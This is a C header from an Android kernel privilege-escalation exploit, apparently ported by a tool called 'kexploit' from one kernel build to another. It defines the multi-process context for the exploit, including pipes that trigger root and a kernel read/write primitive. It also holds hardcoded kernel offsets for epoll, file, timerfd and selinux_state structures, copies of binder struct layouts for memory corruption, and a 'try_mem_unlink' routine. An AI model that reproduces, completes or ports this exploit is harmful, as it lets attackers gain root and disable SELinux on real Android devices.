
// Exploit adapted by kexploit
// Original kernel name: ingots_5.10.101
// Adaptation kernel name: ingots_5.10.107

#ifndef _EXPLOIT_H
#define _EXPLOIT_H

#include <pthread.h>
#include <stdatomic.h>
#include "token_manager.h"
#include "util.h"
#include "binder.h"
#include "binder_client.h"

#define MIN(x,y) ((x) > (y) ? (y) : (x))
#define MAX(x,y) ((x) > (y) ? (x) : (y))

typedef struct {
    usize ts_cred;
    usize pid;
    usize real_parent;
    usize comm;
} TaskStructOffsets;

typedef struct {
    // fd for send and receive ends of pipe for sending commands to b
    int send_command_pipe;
    int recv_command_pipe;

    // fd for send and receive ends of pipe for receiving responses from b
    int send_response_pipe;
    int recv_response_pipe;
} CommandPipe;

typedef struct {
    CommandPipe b_pipe;
    CommandPipe c_pipe;
    CommandPipe d_pipe;

    int trigger_root_pipe[2];
    int root_trigger_responce_pipe[2];

    // token of a
    // b will look in token manager for this token to get a binder reference to a's control node
    struct token a_token;
} ExploitCtx;

typedef enum {
    Read,
    Write,
} KReadWriteOp;

typedef struct {
    atomic_uint status;
    KReadWriteOp op;
    u64 addr;
    u64 size;
    int read_pipe;
    int write_pipe;
} KReadWriteInfo;

typedef struct {
    ExploitCtx *ctx;
    binder_client_t binder;
    u32 c_handle;
    u32 d_handle;
    u32 token_handle;
    // when local context passed to new thread, this instructe new thread id of node to allocate
    binder_uintptr_t allocate_node_id;
    bool allocate_node_forever;
    int epoll_fd;
    int leak_fd;
    u64 kernel_base;
    TaskStructOffsets task_offsets;
    KReadWriteInfo kread_write;
    u64 read_write_thread_task_address;
    pthread_barrier_t read_write_thread_barrier;
} LocalCtx;

void process_a_preregister(LocalCtx *ctx);
void process_a_finish_register(LocalCtx *ctx);
void process_a_register(LocalCtx *ctx);
void process_a_deregister(LocalCtx *ctx);
u64 try_mem_unlink(LocalCtx *ctx, usize prev_addr, usize next_addr, bool leak_only);


#define EP_ITEM_LIST_HEAD_OFFSET 88
// offset from start of epitem struct to 8 bytes controlled by user
#define EP_ITEM_USER_DATA_OFFSET 120

// based of decompilation of `eventpoll_release_file` function, which accesses f_ep_links field
#define FILE_LIST_HEAD_OFFSET 0xe0
// based off decompilation of `do_vfs_ioctl`
#define FILE_INODE_OFFSET 0x20
#define FILE_FOPS_VTABLE_OFFSET 0x28

#define SUPERBLOCK_BLOCK_SIZE_OFFSET 24

#define KERNEL_START 0xffffffc010000000

// offset for android12-5.10.101 ingots kernel on cuttlefish server
#define TIMERFD_FOPS_OFFSET (0xffffffc01201dde0 - KERNEL_START)
#define SELINUX_STATE_OFFSET (0xffffffc012e2b9a8 - KERNEL_START)

// linux kernel binder structs for layout info
struct list_head { 
    struct list_head *next, *prev; 
}; 

struct hlist_head { 
    struct hlist_node *first; 
}; 

struct hlist_node { 
    struct hlist_node *next, **pprev; 
};

struct rb_node {
    unsigned long  __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));

struct rb_root {
    struct rb_node *rb_node;
};

struct binder_work {
    struct list_head entry;

    enum binder_work_type {
        BINDER_WORK_TRANSACTION = 1,
        BINDER_WORK_TRANSACTION_COMPLETE,
        BINDER_WORK_TRANSACTION_ONEWAY_SPAM_SUSPECT,
        BINDER_WORK_RETURN_ERROR,
        BINDER_WORK_NODE,
        BINDER_WORK_DEAD_BINDER,
        BINDER_WORK_DEAD_BINDER_AND_CLEAR,
        BINDER_WORK_CLEAR_DEATH_NOTIFICATION,
    } type;
};

struct binder_node {
	int debug_id;
	//spinlock_t lock;
    // TODO: figure out if this is correct (should be based on offset of ptr and cookie)
    u32 lock;
	struct binder_work work;
	union {
		struct rb_node rb_node;
		struct hlist_node dead_node;
	};
	struct binder_proc *proc;
	struct hlist_head refs;
	int internal_strong_refs;
	int local_weak_refs;
	int local_strong_refs;
	int tmp_refs;
    // Offset 88 and 96
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
	struct {
		/*
		* bitfield elements protected by
		* proc inner_lock
		*/
		u8 has_strong_ref:1;
		u8 pending_strong_ref:1;
		u8 has_weak_ref:1;
		u8 pending_weak_ref:1;
	};
	struct {
		/*
		* invariant after initialization
		*/
		u8 sched_policy:2;
		u8 inherit_rt:1;
		u8 accept_fds:1;
		u8 txn_security_ctx:1;
		u8 min_priority;
	};
	bool has_async_transaction;
	struct list_head async_todo;
};

struct binder_proc {
        struct hlist_node proc_node;
        struct rb_root threads;
        struct rb_root nodes;
        struct rb_root refs_by_desc;
        struct rb_root refs_by_node;
        struct list_head waiting_threads;
        int pid;
        struct task_struct *tsk;
        const struct cred *cred;
        struct hlist_node deferred_work_node;
        int deferred_work;
        int outstanding_txns;
        // stuff after doesn't matter
        // bool is_dead;
        // bool is_frozen;
        // bool sync_recv;
        // bool async_recv;
        // wait_queue_head_t freeze_wait;

        // struct list_head todo;
        // struct binder_stats stats;
        // struct list_head delivered_death;
        // int max_threads;
        // int requested_threads;
        // int requested_threads_started;
        // int tmp_ref;
        // struct binder_priority default_priority;
        // struct dentry *debugfs_entry;
        // struct binder_alloc alloc;
        // struct binder_context *context;
        // spinlock_t inner_lock;
        // spinlock_t outer_lock;
        // struct dentry *binderfs_entry;
        // bool oneway_spam_detection_enabled;
};

#endif
